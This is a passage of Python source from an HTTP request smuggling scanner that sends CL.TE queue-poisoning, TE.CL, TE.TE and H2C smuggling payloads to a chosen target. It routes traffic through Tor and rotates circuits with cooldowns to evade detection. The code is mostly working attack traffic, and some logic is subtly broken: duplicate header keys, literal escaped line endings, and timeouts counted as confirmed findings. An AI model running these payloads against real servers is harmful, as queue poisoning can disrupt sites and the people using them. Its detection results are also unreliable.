        content_type = headers.get('Content-Type', '').lower()
        if 'text/html' in content_type and len(content) < 200:
            indicators.append("small_html_response")
        
        return indicators
    
    def _analyze_headers(self, response_headers, baseline_headers):
        indicators = []

        for k in baseline_headers:
            if k not in response_headers:
                indicators.append(f"missing_header_{k}")

        if response_headers.get("Connection", "").lower() == "close":
            indicators.append("connection_closed")

        base_server = baseline_headers.get("Server")
        resp_server = response_headers.get("Server")

        if base_server and resp_server and base_server != resp_server:
            indicators.append("server_fingerprint_change")

        return indicators
    
    def _analyze_size(self, size, baseline_size, status):
        """Response size analysis"""
        indicators = []
        
        if baseline_size > 0:
            ratio = size / baseline_size if baseline_size > 0 else 1
            
            if status == 200:
                if ratio < 0.1:
                    indicators.append("very_small_200_response")
                elif ratio > 5:
                    indicators.append("very_large_200_response")
            
            if size == 0 and status == 200:
                indicators.append("empty_200_response")
        
        return indicators
    
    def _analyze_connection(self, headers, elapsed):
        """Connection behavior analysis"""
        indicators = []
        
        # Keep-Alive timeout indication
        keep_alive = headers.get('Keep-Alive', '')
        if 'timeout=' in keep_alive and elapsed > 5:
            indicators.append("keep_alive_timeout_indication")
        
        return indicators
    
    def _analyze_for_technique(self, response, technique, payload):
        """Technique-specific analysis"""
        indicators = []
        
        if technique == 'CL.TE':
            # CL.TE often returns quickly with 200 or 404
            if response.status_code in [200, 404] and response.elapsed.total_seconds() < 2:
                indicators.append("fast_CL.TE_response")
        
        elif technique == 'TE.CL':
            # TE.CL often causes timeouts or delays
            if response.elapsed.total_seconds() > 5:
                indicators.append("TE.CL_delay_pattern")
            
            # GPOST method confusion
            if 'gpost' in response.text.lower():
                indicators.append("GPOST_confusion_TE.CL")
        
        elif technique == 'TE.TE':
            # TE.TE often returns 501 or 400 with specific errors
            if response.status_code in [501, 400]:
                if 'transfer' in response.text.lower() or 'encoding' in response.text.lower():
                    indicators.append("TE_specific_error")
        
        return indicators
    
    def _determine_technique_match(self, indicators, payload_technique):
        """Determine which technique the indicators match"""
        technique_scores = {'CL.TE': 0, 'TE.CL': 0, 'TE.TE': 0}
        
        for indicator in indicators:
            if 'CL.TE' in indicator:
                technique_scores['CL.TE'] += 2
            elif 'TE.CL' in indicator:
                technique_scores['TE.CL'] += 2
            elif 'TE.TE' in indicator:
                technique_scores['TE.TE'] += 2
            
            # General indicators
            if 'timeout' in indicator or 'delay' in indicator:
                technique_scores['TE.CL'] += 1
            if '404' in indicator or 'fast' in indicator:
                technique_scores['CL.TE'] += 1
            if '501' in indicator or 'obfuscation' in indicator:
                technique_scores['TE.TE'] += 1
        
        # Find best match
        best_technique = max(technique_scores, key=technique_scores.get)
        if technique_scores[best_technique] > 0:
            return best_technique
        
        return payload_technique
    
    def _calculate_confidence(self, *args, **kwargs):
        try:
            # Normalize input (supports multiple call styles)
            detection = None

            if len(args) > 0:
                detection = args[0]
            elif "detection" in kwargs:
                detection = kwargs["detection"]

            if not detection:
                return "low"

            # Extract safely
            analysis = detection.get("analysis", {})
            indicators = analysis.get("key_indicators", [])

            confidence = analysis.get("confidence", "low")

            # Upgrade confidence if strong signals exist
            if isinstance(indicators, list):
                if len(indicators) >= 3:
                    return "high"
                elif len(indicators) == 2:
                    return "medium"

            # Normalize final output
            if confidence in ["confirmed", "high"]:
                return "high"
            elif confidence == "medium":
                return "medium"
            else:
                return "low"

        except Exception:
            # NEVER crash scanner because of confidence logic
            return "low"
    
    def _get_portswigger_indicators(self, response, payload, key_indicators):
        """Extract PortSwigger-specific indicators"""
        ps_indicators = []
        
        # Check for known PortSwigger patterns
        content = response.text.lower()
        
        # Method confusion
        if 'gpost' in content and 'TE.CL' in payload['technique']:
            ps_indicators.append('portswigger_gpost_confirmation')
        
        # Queue poisoning evidence
        if 'hopefully404' in content and 'CL.TE' in payload['technique']:
            ps_indicators.append('portswigger_queue_poison_indicator')
        
        # Header obfuscation
        if any(x in content for x in ['transfer', 'encoding', 'chunked']) and 'TE.TE' in payload['technique']:
            ps_indicators.append('portswigger_te_obfuscation')
        
        # Size anomalies (PortSwigger research)
        if len(response.content) < 100 and response.status_code == 200:
            ps_indicators.append('portswigger_small_200')
        
        return ps_indicators
    
    # ==================== VALIDATION ENGINE ====================
    
    def perform_validation(self, target_url, detection):
        """Perform PortSwigger-style validation tests"""
        self.log(f"Validating detection: {detection['name']}", "VALIDATION", 1)
        
        # ========== CRITICAL: ADD COOLDOWN ==========
        print(f"[*] Adding 15-second cooldown before validation...")
        time.sleep(15)  # Let server "forget" us
        
        # ========== OPTIONAL: ROTATE TOR CIRCUIT ==========
        if hasattr(self.tor, 'renew_connection'):
            print(f"[*] Rotating Tor circuit for fresh IP...")
            self.tor.renew_connection()
            time.sleep(5)  # Wait for new circuit
        
        parsed = urlparse(target_url)
        unique_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:12]
        
        validation_results = {
            'detection_id': detection.get('test_id', 'unknown'),
            'technique': detection.get('technique', 'unknown'),
            'tests': [],
            'confirmed': False,
            'confidence': 'low'
        }
        
        # CL.TE validation: Queue poisoning test
        if detection['technique'] == 'CL.TE':
            poison_test = self._validate_clte_queue_poisoning(
                parsed, unique_id
            )
            validation_results['tests'].append(poison_test)
            
            if poison_test.get("details", {}).get("evidence") not in [
                "no_poisoning_across_all_endpoints",
                "timeout_during_validation",
                "connection_reset"
            ]:
                validation_results['confirmed'] = True
                validation_results['confidence'] = 'medium'
        
        # TE.CL validation: Method confusion test
        elif detection['technique'] == 'TE.CL':
            method_test = self._validate_tecl_method_confusion(
                parsed, unique_id
            )
            validation_results['tests'].append(method_test)
            
            if method_test.get('success', False):
                validation_results['confirmed'] = True
                validation_results['confidence'] = 'medium'
                self.log(f"TE.CL CONFIRMED via method confusion", "CONFIRMED", 2)
        
        # TE.TE validation: Error reflection test
        elif detection['technique'] == 'TE.TE':
            error_test = self._validate_tete_error_reflection(
                parsed, unique_id
            )
            validation_results['tests'].append(error_test)
            
            if error_test.get('success', False):
                validation_results['confirmed'] = True
                validation_results['confidence'] = 'medium'
                self.log(f"TE.TE CONFIRMED via error reflection", "CONFIRMED", 2)
        
        # H2C validation: HTTP/2 smuggling test
        elif detection['technique'] == 'H2C':
            h2c_test = self._validate_h2c_smuggling(
                parsed, unique_id
            )
            validation_results['tests'].append(h2c_test)
            
            if h2c_test.get('success', False):
                validation_results['confirmed'] = True
                validation_results['confidence'] = 'high'  # H2C findings are high risk
                self.log(f"H2C CONFIRMED via upgrade analysis", "CONFIRMED", 2)
        
        return validation_results

    def _validate_clte_queue_poisoning(self, parsed, unique_id):
        """PROPER validation using KNOWN existing endpoint"""
        test_result = {
            'name': 'CL.TE Queue Poisoning Validation',
            'success': False,
            'details': {}
        }
        
        try:
            # ========== STEP 1: Choose KNOWN existing endpoint ==========
            # Test multiple endpoints for better coverage
            test_endpoints = [
                "/robots.txt",      # Usually exists, static
                "/",                # Homepage
                f"/test-{unique_id}.html",  # Should 404
                "/favicon.ico"      # Often 404
            ]
            
            for known_endpoint in test_endpoints:
                print(f"[*] Testing endpoint: {known_endpoint}")
                
                # ========== STEP 2: Get BASELINE ==========
                print(f"    Step 1: Get baseline")
                baseline_resp = requests.get(
                    f"{parsed.scheme}://{parsed.netloc}{known_endpoint}",
                    headers={
                        'Host': parsed.netloc,
                        'User-Agent': 'Mozilla/5.0 (Validation-Scanner)',
                        'Accept': '*/*'
                    },
                    timeout=10,
                    proxies=getattr(self.tor, 'proxies', None)
                )
                
                baseline_status = baseline_resp.status_code
                baseline_size = len(baseline_resp.content)
                baseline_time = baseline_resp.elapsed.total_seconds()
                
                print(f"        Baseline: Status={baseline_status}, Size={baseline_size}, Time={baseline_time:.2f}s")
                
                # Skip endpoints that always error (except we want to test 404 poisoning)
                if baseline_status >= 500:  # Server errors, skip
                    print(f"        ⏭️  Skipping (server error)")
                    continue
                
                # ========== STEP 3: Create PROPER Poison Request ==========
                print(f"    Step 2: Send CL.TE poison request")
                
                # FIXED: Create proper smuggled request with raw bytes
                smuggled_request = (
                    f"POST {known_endpoint} HTTP/1.1\r\n"
                    f"Host: {parsed.netloc}\r\n"
                    f"X-Smuggled-Poison: {unique_id}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: 15\r\n"
                    f"\r\n"
                    f"poison={unique_id}"
                ).encode('utf-8')
                
                # Chunked body: "0\r\n\r\n" + smuggled request
                poison_body = b"0\r\n\r\n" + smuggled_request
                
                # Calculate correct Content-Length
                content_length = len(poison_body)
                
                # Create poison headers
                poison_headers = {
                    'Host': parsed.netloc,
                    'Content-Length': str(content_length),
                    'Transfer-Encoding': 'chunked',
                    'X-Validation-ID': unique_id,
                    'User-Agent': 'Mozilla/5.0 (Validation-Scanner)',
                    'Accept': '*/*',
                    'Connection': 'keep-alive'  # Critical for queue poisoning!
                }
                
                # Send poison request
                poison_response = requests.post(
                    f"{parsed.scheme}://{parsed.netloc}/",
                    headers=poison_headers,
                    data=poison_body,  # Raw bytes, not string!
                    timeout=15,
                    proxies=getattr(self.tor, 'proxies', None)
                )
                
                poison_status = poison_response.status_code
                poison_time = poison_response.elapsed.total_seconds()
                
                print(f"        Poison sent: Status={poison_status}, Time={poison_time:.2f}s")
                
                # ========== STEP 4: Immediate follow-up ==========
                print(f"    Step 3: Immediate follow-up GET")
                time.sleep(0.05)  # Very small delay for same connection
                
                session = self.tor.get_validation_session()
                
                check_response = session.get(
                    f"{parsed.scheme}://{parsed.netloc}{known_endpoint}",
                    headers={
                        'Host': parsed.netloc,
                        'User-Agent': 'Mozilla/5.0 (Validation-Scanner)',
                        'Accept': '*/*',
                        'Connection': 'keep-alive',
                        'X-Follow-Up': unique_id
                    },
                    timeout=10
                )
                
                check_status = check_response.status_code
                check_size = len(check_response.content)
                check_time = check_response.elapsed.total_seconds()
                check_text = check_response.text[:200]  # Sample for analysis
                
                print(f"        Check: Status={check_status}, Size={check_size}, Time={check_time:.2f}s")
                
                # ========== STEP 5: ENHANCED ANALYSIS ==========
                print(f"    Step 4: Analysis")
                
                evidence_found = None
                
                # CRITERIA 1: Status code change (most reliable)
                if baseline_status != check_status:
                    # Allow 200↔304 (cached) but not 200↔404
                    if not (baseline_status in [200, 304] and check_status in [200, 304]):
                        evidence_found = f'status_change_{baseline_status}_to_{check_status}'
                        print(f"        🚨 STATUS CHANGE: {baseline_status} → {check_status}")
                
                # CRITERIA 2: Significant size difference (>10% or >100 bytes)
                elif abs(baseline_size - check_size) > max(100, baseline_size * 0.1):
                    evidence_found = f'size_change_{baseline_size}_to_{check_size}'
                    print(f"        🚨 SIZE CHANGE: {baseline_size} → {check_size} bytes")
                
                # CRITERIA 3: Unique ID reflection in response
                elif unique_id in check_response.text:
                    evidence_found = 'unique_id_reflection'
                    print(f"        🚨 UNIQUE ID REFLECTION found")
                
                # CRITERIA 4: Error on normally working endpoint
                elif check_status >= 400 and baseline_status < 400:
                    evidence_found = f'error_induced_{check_status}'
                    print(f"        🚨 ERROR INDUCED: {check_status} on normally {baseline_status} endpoint")
                
                # CRITERIA 5: Significant timing anomaly (>3x slower)
                elif check_time > baseline_time * 3 and baseline_time > 0.1:
                    evidence_found = f'timing_anomaly_{baseline_time:.2f}_to_{check_time:.2f}'
                    print(f"        🚨 TIMING ANOMALY: {baseline_time:.2f}s → {check_time:.2f}s")
                
                # CRITERIA 6: Content-type mismatch or unusual headers
                elif 'X-Smuggled-Poison' in str(check_response.headers):
                    evidence_found = 'smuggled_header_reflection'
                    print(f"        🚨 SMUGGLED HEADER REFLECTED")
                
                else:
                    print(f"        ⚠️  No evidence of queue poisoning")
                
                # If we found evidence on ANY endpoint, mark as success
                if evidence_found:
                    test_result['success'] = True
                    test_result['details']['evidence'] = evidence_found
                    test_result['details']['endpoint'] = known_endpoint
                    test_result['details']['baseline'] = {
                        'status': baseline_status,
                        'size': baseline_size,
                        'time': baseline_time
                    }
                    test_result['details']['check'] = {
                        'status': check_status,
                        'size': check_size,
                        'time': check_time,
                        'sample': check_text
                    }
                    break  # Stop testing endpoints if we found vulnerability
            
            if not test_result['success']:
                test_result['details']['evidence'] = 'no_poisoning_across_all_endpoints'
                print(f"[*] No queue poisoning detected across tested endpoints")
            
        except requests.exceptions.Timeout:
            test_result['details']['error'] = 'timeout'
            test_result['details']['evidence'] = 'timeout_during_validation'
            print(f"    ⏱️  Timeout during validation (possible slowloris effect)")
            
        except requests.exceptions.ConnectionError:
            test_result['details']['error'] = 'connection_error'
            test_result['details']['evidence'] = 'connection_reset'
            print(f"    🔌 Connection reset (possible DoS protection)")
            
        except Exception as e:
            test_result['details']['error'] = str(e)
            test_result['details']['evidence'] = f'validation_error: {str(e)[:50]}'
            print(f"    ❌ Validation error: {str(e)[:100]}")
        
        return test_result

    def _validate_tecl_method_confusion(self, parsed, unique_id):
        """Validate TE.CL via method confusion"""
        test_result = {
            'name': 'TE.CL Method Confusion Validation',
            'success': False,
            'details': {}
        }
        
        try:
            # ========== TEST 1: Basic TE.CL with GPOST ==========
            print(f"[*] TE.CL Test 1: GPOST method confusion")
            
            headers = {
                'Host': parsed.netloc,
                'Transfer-Encoding': 'chunked',
                'Content-Length': '4',  # Conflict with TE
                'X-Validation-ID': unique_id,
                'User-Agent': 'Mozilla/5.0 (TE.CL-Test)',
                'Connection': 'keep-alive'
            }
            
            # FIXED: Use raw bytes with proper chunk format
            # Chunk size: 4 (hex) + CRLF + data + CRLF + 0 + CRLF + CRLF
            body = b'4\r\nGPOS\r\n0\r\n\r\n'
            
            response = requests.post(
                f"{parsed.scheme}://{parsed.netloc}/",
                headers=headers,
                data=body,  # Raw bytes!
                timeout=15,
                proxies=getattr(self.tor, 'proxies', None)
            )
            
            test_result['details']['test1'] = {
                'status': response.status_code,
                'time': response.elapsed.total_seconds(),
                'headers': dict(response.headers),
                'content_sample': response.text[:200]
            }
            
            print(f"    Status: {response.status_code}, Time: {response.elapsed.total_seconds():.2f}s")
            
            # ========== TEST 2: TE.CL with delayed chunk ==========
            print(f"[*] TE.CL Test 2: Delayed chunk test")
            time.sleep(0.5)
            
            headers2 = {
                'Host': parsed.netloc,
                'Transfer-Encoding': 'chunked',
                'Content-Length': '100',  # Much larger than actual body
                'X-Validation-ID': f"{unique_id}-delay",
                'User-Agent': 'Mozilla/5.0 (TE.CL-Delay)',
                'Connection': 'keep-alive'
            }
            
            # Send incomplete chunked data
            body2 = b'5\r\nDELAY\r\n'  # Missing final 0\r\n\r\n
            
            try:
                response2 = requests.post(
                    f"{parsed.scheme}://{parsed.netloc}/",
                    headers=headers2,
                    data=body2,
                    timeout=5,  # Shorter timeout for this test
                    proxies=getattr(self.tor, 'proxies', None)
                )
                test_result['details']['test2'] = {
                    'status': response2.status_code,
                    'time': response2.elapsed.total_seconds()
                }
            except requests.exceptions.Timeout:
                test_result['details']['test2'] = {'timeout': True}
                print(f"    ⏱️  Timeout (backend waiting for more chunks - GOOD SIGN)")
            
            # ========== ANALYSIS ==========
            print(f"[*] TE.CL Analysis:")
            
            # Check 1: GPOST reflection in response
            if 'gpost' in response.text.lower() or 'GPOS' in response.text:
                test_result['success'] = True
                test_result['details']['evidence'] = 'GPOST_reflection'
                print(f"    🚨 GPOST method reflected in response")
            
            # Check 2: 405 Method Not Allowed for unexpected method
            elif response.status_code == 405:
                test_result['success'] = True
                test_result['details']['evidence'] = '405_unexpected_method'
                print(f"    🚨 405 Method Not Allowed (unexpected method processed)")
            
            # Check 3: Timeout indicates backend waiting
            elif test_result['details'].get('test2', {}).get('timeout'):
                test_result['success'] = True
                test_result['details']['evidence'] = 'timeout_TE.CL_pattern'
                print(f"    🚨 Timeout pattern indicates TE.CL desync")
            
            # Check 4: Unusual status codes
            elif response.status_code not in [200, 400, 501]:
                test_result['success'] = True
                test_result['details']['evidence'] = f'unusual_status_{response.status_code}'
                print(f"    🚨 Unusual status code: {response.status_code}")
            
            # Check 5: Connection header manipulation
            elif response.headers.get('Connection', '').lower() == 'close':
                test_result['success'] = True
                test_result['details']['evidence'] = 'connection_closed_TE.CL'
                print(f"    🚨 Connection closed unexpectedly")
            
            else:
                test_result['details']['evidence'] = 'no_TE.CL_confirmation'
                print(f"    ⚠️  No TE.CL confirmation")
            
        except Exception as e:
            test_result['details']['error'] = str(e)
            test_result['details']['evidence'] = f'TE.CL_error: {str(e)[:50]}'
            print(f"    ❌ TE.CL validation error: {str(e)[:100]}")
        
        return test_result

    def _validate_tete_error_reflection(self, parsed, unique_id):
        """Validate TE.TE via error reflection"""
        test_result = {
            'name': 'TE.TE Error Reflection Validation',
            'success': False,
            'details': {}
        }
        
        try:
            # ========== TEST 1: Case obfuscation ==========
            print(f"[*] TE.TE Test 1: Case obfuscation")
            
            headers1 = {
                'Host': parsed.netloc,
                'Transfer-Encoding': 'chunked',
                'Transfer-encoding': 'identity',  # Different case!
                'X-Validation-ID': unique_id,
                'User-Agent': 'Mozilla/5.0 (TE.TE-Case)',
                'Connection': 'keep-alive'
            }
            
            body1 = b'0\r\n\r\nINVALID'  # Extra data after 0\r\n\r\n
            
            response1 = requests.post(
                f"{parsed.scheme}://{parsed.netloc}/",
                headers=headers1,
                data=body1,
                timeout=10,
                proxies=getattr(self.tor, 'proxies', None)
            )
            
            test_result['details']['test1'] = {
                'status': response1.status_code,
                'content': response1.text[:300],
                'headers': dict(response1.headers)
            }
            
            print(f"    Status: {response1.status_code}, Size: {len(response1.content)} bytes")
            
            # ========== TEST 2: Space/tab obfuscation ==========
            print(f"[*] TE.TE Test 2: Space prefix obfuscation")
            time.sleep(0.3)
            
            headers2 = {
                'Host': parsed.netloc,
                'Transfer-Encoding': 'chunked',
                'Transfer-Encoding': ' chunked',  # Leading space
                'X-Validation-ID': f"{unique_id}-space",
                'User-Agent': 'Mozilla/5.0 (TE.TE-Space)'
            }
            
            # Empty chunked body
            body2 = b'0\r\n\r\n'
            
            response2 = requests.post(
                f"{parsed.scheme}://{parsed.netloc}/",
                headers=headers2,
                data=body2,
                timeout=10,
                proxies=getattr(self.tor, 'proxies', None)
            )
            
            test_result['details']['test2'] = {
                'status': response2.status_code,
                'content': response2.text[:200]
            }
            
            # ========== TEST 3: Comma separation ==========
            print(f"[*] TE.TE Test 3: Comma separation")
            time.sleep(0.3)
            
            headers3 = {
                'Host': parsed.netloc,
                'Transfer-Encoding': 'chunked, identity',
                'X-Validation-ID': f"{unique_id}-comma",
                'User-Agent': 'Mozilla/5.0 (TE.TE-Comma)'
            }
            
            # Malformed chunk
            body3 = b'X\r\nINVALID_CHUNK\r\n0\r\n\r\n'
            
            response3 = requests.post(
                f"{parsed.scheme}://{parsed.netloc}/",
                headers=headers3,
                data=body3,
                timeout=10,
                proxies=getattr(self.tor, 'proxies', None)
            )
            
            test_result['details']['test3'] = {
                'status': response3.status_code,
                'content': response3.text[:200]
            }
            
            # ========== ANALYSIS ==========
            print(f"[*] TE.TE Analysis:")
            
            # Combine all responses for analysis
            all_responses = [
                (response1, 'test1'),
                (response2, 'test2'),
                (response3, 'test3')
            ]
            
            for response, test_name in all_responses:
                content_lower = response.text.lower()
                
                # Check 1: TE-specific error messages
                te_keywords = ['transfer-encoding', 'chunked', 'unsupported', 'invalid', 
                              'encoding', 'length', 'malformed', 'bad request']
                
                te_errors_found = [kw for kw in te_keywords if kw in content_lower]
                
                if te_errors_found:
                    test_result['success'] = True
                    test_result['details']['evidence'] = f'TE_errors_{test_name}:{",".join(te_errors_found[:3])}'
                    print(f"    🚨 TE-specific errors found in {test_name}: {', '.join(te_errors_found[:3])}")
                    break
                
                # Check 2: Status 501 Not Implemented
                elif response.status_code == 501:
                    test_result['success'] = True
                    test_result['details']['evidence'] = f'501_not_implemented_{test_name}'
                    print(f"    🚨 501 Not Implemented in {test_name}")
                    break
                
                # Check 3: Backend software leak
                backend_indicators = ['nginx', 'apache', 'iis', 'openresty', 'httpd', 'microsoft']
                backend_leak = [bi for bi in backend_indicators if bi in content_lower]
                
                if backend_leak:
                    test_result['success'] = True
                    test_result['details']['evidence'] = f'backend_leak_{test_name}:{backend_leak[0]}'
                    print(f"    🚨 Backend leak in {test_name}: {backend_leak[0]}")
                    break
                
                # Check 4: Connection closure with data
                elif response.status_code == 400 and len(response.content) > 1000:
                    # Large 400 response often contains debug info
                    test_result['success'] = True
                    test_result['details']['evidence'] = f'large_error_response_{test_name}'
                    print(f"    🚨 Large error response in {test_name} ({len(response.content)} bytes)")
                    break
            
            if not test_result['success']:
                test_result['details']['evidence'] = 'no_TE.TE_error_reflection'
                print(f"    ⚠️  No TE.TE error reflection detected")
            
        except Exception as e:
            test_result['details']['error'] = str(e)
            test_result['details']['evidence'] = f'TE.TE_error: {str(e)[:50]}'
            print(f"    ❌ TE.TE validation error: {str(e)[:100]}")
        
        return test_result

    def _validate_h2c_smuggling(self, parsed, unique_id):
        """Validate H2C via upgrade analysis and smuggling attempts"""

        test_result = {
            'name': 'H2C Upgrade Validation',
            'success': False,
            'details': {}
        }

        try:
            session = self.tor.get_validation_session()

            # ========== TEST 1: Basic H2C upgrade attempt ==========
            print(f"[*] H2C Test 1: Basic upgrade attempt")

            h2c_headers = {
                'Host': parsed.netloc,
                'Upgrade': 'h2c',
                'HTTP2-Settings': 'AAMAAABkAAQAAP__',
                'Connection': 'Upgrade, HTTP2-Settings',
                'Content-Length': '0',
                'X-Validation-ID': unique_id,
                'User-Agent': 'Mozilla/5.0 (H2C-Test)'
            }

            response1 = session.post(
                f"{parsed.scheme}://{parsed.netloc}/",
                headers=h2c_headers,
                data='',
                timeout=15
            )

            test_result['details']['basic_test'] = {
                'status': response1.status_code,
                'upgrade_header': response1.headers.get('Upgrade', ''),
                'connection_header': response1.headers.get('Connection', ''),
                'content_length': len(response1.content)
            }

            print(f"    Status: {response1.status_code}, Upgrade: {response1.headers.get('Upgrade', 'None')}")

            # ========== TEST 2: H2C with smuggled preface ==========
            print(f"[*] H2C Test 2: With HTTP/2 preface")
            time.sleep(0.5)

            h2_preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
            settings_frame = b'\x00\x00\x00\x04\x00\x00\x00\x00\x00'

            smuggled_request = (
                f"GET /h2c-test-{unique_id} HTTP/1.1\r\n"
                f"Host: {parsed.netloc}\r\n"
                f"X-Smuggled-H2C: {unique_id}\r\n"
                f"\r\n"
            ).encode()

            h2c_body = h2_preface + settings_frame + smuggled_request

            h2c_smuggle_headers = {
                'Host': parsed.netloc,
                'Upgrade': 'h2c',
                'HTTP2-Settings': 'AAMAAABkAAQAAP__',
                'Connection': 'Upgrade, HTTP2-Settings',
                'Content-Length': str(len(h2c_body)),
                'X-Validation-ID': f"{unique_id}-h2c-smuggle"
            }

            response2 = session.post(
                f"{parsed.scheme}://{parsed.netloc}/",
                headers=h2c_smuggle_headers,
                data=h2c_body,
                timeout=15
            )

            test_result['details']['smuggle_test'] = {
                'status': response2.status_code,
                'content_sample': response2.text[:200]
            }

            # ========== TEST 3: Check smuggled endpoint ==========
            print(f"[*] H2C Test 3: Check smuggled endpoint")
            time.sleep(0.5)

            check_url = f"{parsed.scheme}://{parsed.netloc}/h2c-test-{unique_id}"

            check_response = None
            try:
                check_response = session.get(
                    check_url,
                    headers={
                        'Host': parsed.netloc,
                        'X-Check-H2C': unique_id
                    },
                    timeout=10
                )

                test_result['details']['check_test'] = {
                    'status': check_response.status_code,
                    'content': check_response.text[:200]
                }

                print(f"    Check status: {check_response.status_code}")

            except Exception as e:
                test_result['details']['check_test'] = {
                    'error': str(e)[:80]
                }
                print(f"    ⚠️ Check request failed: {str(e)[:80]}")

            # ========== TEST 4: Conflicting headers ==========
            print(f"[*] H2C Test 4: Conflicting headers")
            time.sleep(0.5)

            h2c_conflict_headers = {
                'Host': parsed.netloc,
                'Upgrade': 'h2c, websocket',
                'HTTP2-Settings': 'AAMAAABkAAQAAP__',
                'Connection': 'Upgrade, HTTP2-Settings, Keep-Alive',
                'Content-Length': '100',
                'Transfer-Encoding': 'chunked',
                'X-Validation-ID': f"{unique_id}-conflict"
            }

            try:
                response3 = session.post(
                    f"{parsed.scheme}://{parsed.netloc}/",
                    headers=h2c_conflict_headers,
                    data='0\r\n\r\n',
                    timeout=10
                )

                test_result['details']['conflict_test'] = {
                    'status': response3.status_code
                }

            except Exception as e:
                test_result['details']['conflict_test'] = {
                    'error': str(e)[:80]
                }

            # ========== ANALYSIS ==========
            print(f"[*] H2C Analysis:")

            upgrade_header = response1.headers.get('Upgrade', '')
            connection_header = response1.headers.get('Connection', '')

            response_text = (response1.text or "").lower()

            # 1. Full protocol upgrade
            if response1.status_code == 101:
                test_result['success'] = True
                test_result['details']['evidence'] = 'H2C_upgrade_101'
                test_result['details']['confidence'] = 'high'
                print("    🚨 H2C upgrade successful (101)")

            # 2. Upgrade advertised
            elif 'h2' in upgrade_header.lower():
                test_result['success'] = True
                test_result['details']['evidence'] = 'H2_advertised'
                test_result['details']['confidence'] = 'medium'
                print(f"    🚨 H2 advertised: {upgrade_header}")

            # 3. Smuggled endpoint triggered
            elif check_response and hasattr(check_response, "text") and unique_id in check_response.text:
                test_result['success'] = True
                test_result['details']['evidence'] = 'smuggle_reflection'
                test_result['details']['confidence'] = 'high'
                print("    🚨 Smuggled request reflected")

            # 4. Suspicious 200 with upgrade header
            elif response1.status_code == 200 and 'upgrade' in upgrade_header.lower():
                test_result['success'] = True
                test_result['details']['evidence'] = '200_upgrade_anomaly'
                test_result['details']['confidence'] = 'medium'
                print("    🚨 200 OK with Upgrade header")

            # 5. Protocol-related errors
            elif response1.status_code >= 400 and any(
                x in response_text for x in ['http/2', 'h2c', 'upgrade', 'protocol']
            ):
                test_result['success'] = True
                test_result['details']['evidence'] = 'h2c_error_indicators'
                test_result['details']['confidence'] = 'medium'
                print("    🚨 H2C protocol errors detected")

            # 6. Connection downgrade anomaly
            elif (
                connection_header.lower() == 'close'
                and 'upgrade' in h2c_headers['Connection'].lower()
            ):
                test_result['success'] = True
                test_result['details']['evidence'] = 'connection_downgrade'
                test_result['details']['confidence'] = 'low'
                print("    🚨 Connection downgrade anomaly")

            else:
                test_result['details']['evidence'] = 'no_h2c_signal'
                print("    ⚠️ No H2C vulnerability detected")

        except requests.exceptions.Timeout:
            test_result['details']['error'] = 'timeout'
            test_result['details']['evidence'] = 'h2c_timeout'
            test_result['success'] = True  # timeout can be meaningful
            print("    ⏱️ Timeout during H2C test")

        except Exception as e:
            test_result['details']['error'] = str(e)[:120]
            test_result['details']['evidence'] = 'h2c_exception'
            print(f"    ❌ H2C validation error: {str(e)[:120]}")

        return test_result

    def _clean_response_for_comparison(self, text):
        """Remove dynamic content for accurate comparison"""
        if not text:
            return ""
        
        # Remove common dynamic elements
        cleaned = text
        
        # Remove timestamps (Unix timestamps, ISO dates)
        cleaned = re.sub(r'\d{10,}', '[TIMESTAMP]', cleaned)
        cleaned = re.sub(r'\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}', '[ISODATE]', cleaned)
        
        # Remove CSRF tokens
        cleaned = re.sub(r'csrf_token=[a-fA-F0-9]{32,}', 'csrf_token=[TOKEN]', cleaned)
        cleaned = re.sub(r'_token" value="[^"]{20,}"', '_token" value="[TOKEN]"', cleaned)
        
        # Remove session IDs
        cleaned = re.sub(r'session=[a-fA-F0-9]{20,}', 'session=[SESSION]', cleaned)
        cleaned = re.sub(r'PHPSESSID=[a-fA-F0-9]{20,}', 'PHPSESSID=[SESSION]', cleaned)
        
        # Remove random nonces
        cleaned = re.sub(r'nonce="[a-fA-F0-9]{16,}"', 'nonce="[NONCE]"', cleaned)
        
        # Remove IP addresses
        cleaned = re.sub(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', '[IP]', cleaned)
        
        return cleaned

    def _analyze_error_patterns(self, response_text):
        """Analyze error messages for backend fingerprinting"""
        indicators = {
            'nginx': ['nginx/', 'openresty'],
            'apache': ['apache/', 'httpd/'],
            'iis': ['microsoft-iis/', 'internet information services'],
            'cloudflare': ['cloudflare'],
            'cloudfront': ['cloudfront'],
            'akamai': ['akamaighost'],
            'fastly': ['fastly']
        }
        
        detected = []
        text_lower = response_text.lower()
        
        for software, patterns in indicators.items():
            for pattern in patterns:
                if pattern in text_lower:
                    detected.append(software)
                    break
        
        return detected
        
    
    # ==================== ENHANCED RAW REQUEST VALIDATION ====================
    
    def perform_raw_validation(self, target_url, detections):
        """Validate with raw HTTP requests"""
        if not self.enable_raw:
            return []
        
        self.log("Performing raw HTTP validation", "VALIDATION", 0)
        
        parsed = urlparse(target_url)
        raw_results = []
        
        # Test most promising detections with raw requests
        for detection in detections[:3]:  # Limit to top 3
            try:
                raw_result = {
                    'detection': detection['name'],
                    'technique': detection['technique'],
                    'success': False,
                    'details': {}
                }
                
                # Technique-specific raw validation
                if detection['technique'] == 'H2C':
                    raw_test = self._perform_raw_h2c_validation(parsed, detection)
                    raw_result.update(raw_test)
                    
                elif detection['technique'] == 'CL.TE':
                    # Build CL.TE raw request
                    headers = OrderedDict([
                        ('Host', parsed.netloc),
                        ('Content-Length', '53'),
                        ('Transfer-Encoding', 'chunked'),
                        ('X-Raw-Test', 'true')
                    ])
                    
                    body = '0\\r\\n\\r\\nGET /raw-test HTTP/1.1\\r\\nHost: TARGET\\r\\n\\r\\n'
                    body = body.replace('TARGET', parsed.netloc)
                    
                    request = self.raw_client.build_complete_request(
                        method='POST',
                        host=parsed.hostname,
                        port=parsed.port or 80,
                        path=parsed.path or '/',
                        headers=headers,
                        body=body
                    )
                    
                    # Send raw request
                    raw_response = self.raw_client.send_request(
                        parsed.hostname,
                        parsed.port or 80,
                        request,
                        timeout=15
                    )
                    
                    raw_result['raw_response'] = raw_response[:500]
                    raw_result['success'] = '200' in raw_response[:20] or '404' in raw_response[:20]
                
                else:
                    # Generic raw test for other techniques
                    headers = OrderedDict([
